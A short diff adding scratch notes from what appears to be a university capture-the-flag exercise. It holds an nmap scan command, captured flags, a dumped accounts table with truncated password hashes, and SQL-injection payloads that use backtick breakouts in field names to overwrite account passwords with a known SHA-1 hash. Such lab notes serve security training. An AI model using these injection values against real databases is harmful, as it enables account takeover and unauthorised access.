@@ -12,3 +12,32 @@ Nmap done: 256 IP addresses (4 hosts up) scanned in 2.91 seconds
 
 
  nmap -p- 192.168.160.213
+
+
+ SpeishFlag{p8KXaXAGa5boHz6lWa4S1CfS8THOsF7F}
+61e0024fc2
+
+
+id | privilege | fullname | username | password | description | profile_img
+2 | 50 | El Dekhan | dekhan | 83592796bc17705662dc... | According to the rul... | profile/mib.jpg
+3 | 30 | Alexander (DBA) | boicea | cf1cc04e913f3f05008a... | My name is Mr. Alexa... | profile/boicea.jpg
+9 | 5 | Prison Guard | guard | 83592796bc17705662dc... | Mi se spune Pentium ... | profile/pumniimei.jp...
+50 | 1 | Just the janitor | janitor | b663e3a2f12abbcffb71... | sudo make clean  # m... | profile/janitor.jpg
+51 | 1 | Mihai UNSTPB | mihai.rector | d8f8fff4474595fc34b5... | Don't worry, I will ... | profile/mihai.jpg
+66 | 0 | VNO | vno | b0654dec7105b7bcdd38... | "Lamentabil! Imi vad... | profile/anonymous.jp...
+69 | 0 | Inmate | student#11919 | 204036a1ef6e7360e536... | Hey, what an I even ... | profile/unknown.jpg
+70 | 0 | Dani | dani | 5af13f5c3bba8d11b776... | Nu e o scena din fil... | profile/dani_mocanu....
+
+
+update, accounts, id=77, profile_img=profile/vader.jpg, username` is not null OR `username=rekt0r
+update, accounts, password=83592796bc17705662dc9a750c8b6d0a4fd93396, id=77
+update, accounts, id=1, profile_img=profile/vader.jpg, username` is not null OR `username=rekt0r
+
+sha1(parola)=83592796bc17705662dc9a750c8b6d0a4fd93396
+
+VARIANTA 2
+update, accounts, password=83592796bc17705662dc9a750c8b6d0a4fd93396, id` < ? # =2
+
+SpeishFlag{nA0eBcpak4lHW6CBkScqVEEtNVQMXKZc}
+152360752a
+drwxr-xr-x 1 nginx nginx 4096 May 15 17:35 /var/www
